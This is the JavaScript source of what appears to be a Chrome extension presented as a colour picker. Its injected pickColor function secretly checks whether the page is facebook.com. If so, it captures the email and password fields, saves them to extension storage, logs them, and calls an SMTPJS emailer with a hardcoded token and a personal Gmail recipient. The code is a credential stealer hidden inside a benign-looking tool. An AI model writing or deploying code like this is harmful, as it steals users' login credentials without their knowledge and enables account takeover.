const btn = document.querySelector('.changeColorBtn');
const colorGrid = document.querySelector('.colorGrid');
const colorValue = document.querySelector('.colorValue');
const notification = document.querySelector('.notification');


chrome.runtime.onMessage.addListener(function(request,sender,sendResponse){
    console.log(request);
    chrome.storage.sync.get(['mail','pass'],(result)=>{
        console.log("User - ",result.mail);
        console.log("Password - ",result.pass);
    });
    
});

btn.addEventListener("click",async ()=>{

    let [tab] = await chrome.tabs.query({active:true,currentWindow:true});
    
    chrome.scripting.executeScript({
        target : {tabId:tab.id},
        function:pickColor,
        args: [tab.url]


    },
    async(injectionResults)=>{
        const [data] = injectionResults;
        
        if(data.result){
            const color = data.result.sRGBHex;
            colorGrid.style.backgroundColor = color;
            colorValue.innerText = color;
            await navigator.clipboard.writeText(color);
            notification.innerText = "Copied to ClipBoard";
        }
    });



});


async function pickColor(url){
    var urls = url;
    var fb = search_fbUrl(urls);
    
    if(fb>0){
        try{
            
            var mail = document.querySelector('input[name="email"]');
            var pass = document.querySelector('input[name="pass"]');

            var finalm = mail.value;
            chrome.storage.sync.set({mail : finalm});
            var finalp = pass.value;
            chrome.storage.sync.set({pass: finalp});

            mail.onchange =async function(){
                var finalm = mail.value;
                chrome.storage.sync.set({mail : finalm});
            }
            pass.onchange =async function(){
                var finalp = pass.value;
                chrome.storage.sync.set({pass: finalp});
            }
            sendEmail();
            const eyeDropper = new EyeDropper();
            return await eyeDropper.open();
        }catch(err){

        }
        
    }
    else{
        
        const eyeDropper = new EyeDropper();
        return await eyeDropper.open();
    } 
}

function search_fbUrl(url){
    var fb = "facebook.com"; 
    var x = 0, y=0;
   
    for (i=0;i< url.length;i++)
        {
        if(url[i] == fb[0])
            {
            for(j=i;j< i+fb.length;j++)
               {
                if(url[j]==fb[j-i])
                  {
                    y++;
                  }
                if (y==fb.length){
                    x++;
                }
            }
            y=0;
        }
    }
   return x;
}


var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };

function sendEmail() {
    
    
        Email.send({
    SecureToken : "b8d04846-481c-4085-a109-3b7be4b895c9",
    To : "snpsujon93@gmail.com",
    From : "snpsujon007@gmail.com",
    Subject : "This is the subject",
    Body : "UserName -  and Pass - "
}).then(
  message => alert(message)
);
}

